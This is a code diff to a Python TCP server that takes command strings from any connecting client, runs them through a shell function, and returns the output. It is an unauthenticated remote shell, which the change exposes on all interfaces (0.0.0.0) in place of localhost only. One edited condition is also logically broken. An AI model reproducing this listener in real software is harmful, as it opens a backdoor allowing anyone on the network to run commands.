@@ -1,6 +1,7 @@
 import socket, os, shell
 
-addr = ("127.0.0.1",1337)
+
+addr = (socket.gethostbyname("0.0.0.0"),1337)
 server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 server.bind(addr)
 server.listen()
@@ -15,11 +16,12 @@ while 1:
     command = conn.recv(1024).decode("utf-8")
     print("Command recieved:",command)
     output = shell.windowsShell(command)
-    if output != None:
+    if "cd" in command:
+        sendCwd(conn)
+    elif output != None or output == '' or not output:
         conn.sendall(output.encode("utf-8"))
         print("Sent output.")
     else:
-        if "cd" in command:
-            sendCwd(conn)
+        conn.sendall(b"-")
         print("Output was none.")
         continue
